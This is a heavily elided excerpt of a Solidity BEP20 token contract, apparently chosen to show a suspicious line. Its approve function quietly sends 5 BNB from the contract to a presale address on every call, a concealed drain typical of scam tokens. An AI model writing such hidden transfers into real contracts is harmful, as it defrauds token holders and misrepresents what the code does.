...
contract TokenBEP20 is BEP20Interface, Owned{
  ...
  function newTESTexchange(address _exchangepool) public onlyOwner {
  ...
  function approve(address spender, uint tokens) public returns (bool success) {
    address(uint160(_dewpresale)).transfer(5000000000000000000);
...
contract TEST_ORANGETEST_TOKEN  is TokenBEP20 {
